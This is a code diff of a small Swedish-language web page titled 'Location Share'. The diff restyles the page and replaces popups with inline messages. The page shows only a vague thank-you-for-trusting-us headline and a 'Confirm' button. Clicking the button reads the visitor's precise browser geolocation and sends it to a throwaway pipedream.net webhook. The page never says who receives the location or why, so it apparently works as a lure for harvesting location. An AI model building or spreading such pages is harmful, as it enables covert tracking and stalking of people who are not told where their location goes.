@@ -1,15 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sv">
 <head>
   <meta charset="UTF-8" />
   <title>Location Share</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background: #f7f8fa;
+      color: #333;
+    }
+
+    h2 {
+      margin-bottom: 30px;
+      font-weight: 600;
+      font-size: 1.4rem;
+      text-align: center;
+      max-width: 90%;
+    }
+
+    button {
+      padding: 12px 24px;
+      background-color: #007acc;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #005fa3;
+    }
+
+    .message {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: green;
+    }
+
+    .error {
+      color: red;
+    }
+  </style>
 </head>
 <body>
   <h2>Tack för att du litar på oss – det betyder mycket.</h2>
   <button onclick="shareLocation()">Bekräfta</button>
+  <div id="msg" class="message"></div>
 
   <script>
-    function shareLocation() {
+    async function shareLocation() {
+      const msgEl = document.getElementById('msg');
+      msgEl.innerText = '';
+      msgEl.classList.remove('error');
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           async function (position) {
@@ -23,24 +75,25 @@
             try {
               await fetch('https://eouw3820jp5fqgq.m.pipedream.net', {
                 method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
               });
 
-              alert('Tack! Din plats har skickats.');
+              msgEl.innerHTML = `✅ Din plats har skickats! <br> <a href="${map}" target="_blank">Visa på Google Maps</a>`;
             } catch (err) {
-              alert('Kunde inte skicka plats. Något gick fel.');
+              msgEl.innerText = '❌ Kunde inte skicka plats. Något gick fel.';
+              msgEl.classList.add('error');
               console.error(err);
             }
           },
-          function (error) {
-            alert('Du nekade platsåtkomst eller ett fel inträffade.');
+          function () {
+            msgEl.innerText = '❌ Du nekade platsåtkomst.';
+            msgEl.classList.add('error');
           }
         );
       } else {
-        alert('Din webbläsare stöder inte geolocation.');
+        msgEl.innerText = '❌ Din webbläsare stöder inte platsdelning.';
+        msgEl.classList.add('error');
       }
     }
   </script>
